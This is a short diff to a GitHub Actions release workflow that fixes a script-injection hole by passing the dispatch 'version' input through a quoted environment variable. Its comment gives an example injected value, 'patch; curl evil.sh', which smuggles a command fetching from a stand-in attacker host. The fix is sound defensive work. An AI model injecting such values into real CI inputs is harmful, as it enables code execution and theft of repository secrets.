@@ -30,7 +30,12 @@ jobs:
         git config user.name "github-actions[bot]"
         git config user.email "github-actions[bot]@users.noreply.github.com"
     - name: Create release
-      run: pnpm release ${{ github.event.inputs.version }}
+      env:
+        # Pass the dispatch input through the environment instead of inline
+        # interpolation: a value like `patch; curl evil.sh` must never become
+        # part of the shell command line.
+        RELEASE_VERSION: ${{ github.event.inputs.version }}
+      run: pnpm release "$RELEASE_VERSION"
     - name: Print details
       run: |
         cat package.json
